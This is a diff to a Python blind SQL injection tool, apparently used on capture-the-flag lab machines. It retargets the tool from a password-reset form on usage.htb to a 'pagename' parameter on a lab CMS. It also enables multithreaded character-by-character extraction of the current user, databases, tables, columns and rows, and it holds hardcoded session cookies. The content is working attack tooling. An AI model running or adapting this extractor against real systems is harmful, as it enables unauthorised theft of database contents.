@@ -64,19 +64,14 @@ signal.signal(signal.SIGINT, ctrlC)
 
 
 # Global Variables
-main_url = "http://usage.htb/forget-password"
-method = "POST"
-headers = {
-    "Cookie": "XSRF-TOKEN=eyJpdiI6Ik5UdHlSV1BvNlN1Z3Z0cnc5eVhWZ0E9PSIsInZhbHVlIjoiU1JaUXFXTzVhTUtmdFZtL3NoSjZycmR3TFp6MVhvRktKeUlrV1Y3ZCtsd0c3eG05a2JRMjg0YUtxQWVaK21mazBRTVZBNTlSU1E1d2VMbUZXZS9JdE5MTVVQNzFDMVZlTEl4M0Zydk5NbU1zTWx1RWZmUmNOVjE1UEt5S2U3SE0iLCJtYWMiOiIyZDMyY2U2YTU1NmIxMjBiNmZlYWEwYTc1MDQ3M2VjNmRhMDNjNDI5NTcyNDNlNmNlYzM1OTg5YTA4OGFhNmJhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkZHTUNLNW9GaHA3ejR5NFVDRlk4SHc9PSIsInZhbHVlIjoicWxrSEVwakFtdFRydW9MMWhhZ3Q0c2JkVlI1MFNYVk1iSTFkUUoyanVWem9KQnFWVEo2WGFDV3RLNmRHajFweGd5ai9MSkowSHJQRnFKWUMwZHRVRkdtNWdvR0J2dHdBZGd5ZDBkUm1hMHhzVXJEUkNVOTYyMnFMY0RFNlVieGoiLCJtYWMiOiJjYWNkNTY2N2UzZGU3Y2I0MmUyZTIxYWU3MmVlYWVjODMyZmZkZTAyNzRhNTczMGQ0NTZiMmEyMDU2YmI5NGIwIiwidGFnIjoiIn0%3D"
-}
-post_data = {
-    "_token": "nvjaHdA6sxbYR3fG4wKK5szM3yP43Om78wIAh6ma",
-    "email": "test@gmail.com",
-}
-post_data_exploit = "email"
-get_data = ""
-condition = "We have e-mailed your password reset link to"
-num_threads = 1
+main_url = "http://192.168.130.132/imfadministrator/cms.php?pagename="
+method = "GET"
+headers = {"Cookie": "PHPSESSID=0b1doinsnatq60ar69emj3nh75"}
+post_data = {}
+post_data_exploit = ""
+get_data = "home"
+condition = "Welcome to the IMF Administration"
+num_threads = 10
 dbs = []
 
 
@@ -111,7 +106,10 @@ def build_data(info_name, position, db, table):
             result.append(WrapperRequest(data, character))
         else:
             result.append(
-                f"{main_url}{build_payload(info_name,position,character, db, table)}"
+                WrapperRequest(
+                    f"{main_url}{get_data}{build_payload(info_name,position,character, db, table)}",
+                    character,
+                )
             )
 
     return result
@@ -122,7 +120,8 @@ def send_request(requests_data):
     if method == "POST":
         response = requests.post(main_url, headers=headers, data=requests_data.data)
     else:
-        response = requests.get(requests_data, headers=headers)
+        response = requests.get(requests_data.data, headers=headers)
+
     return WrapperResponse(response.text, requests_data.character)
 
 
@@ -141,7 +140,6 @@ def get_info(label_info, label_menu, info_name, db=None, table=None):
             responses = list(executor.map(send_request, requests_data))
 
         for response in responses:
-            print(response.character)
             if condition in response.text:
                 info += chr(response.character)
                 label_info.status(f"{Color.GREEN}{info}{Color.END}")
@@ -432,10 +430,10 @@ def main():
     time.sleep(1)
 
     get_user(label_menu)
-    # get_dbs(label_menu)
-    # get_tables(label_menu)
-    # get_columns(label_menu)
-    # get_rows(label_menu)
+    get_dbs(label_menu)
+    get_tables(label_menu)
+    get_columns(label_menu)
+    get_rows(label_menu)
     # build_file()
 
 
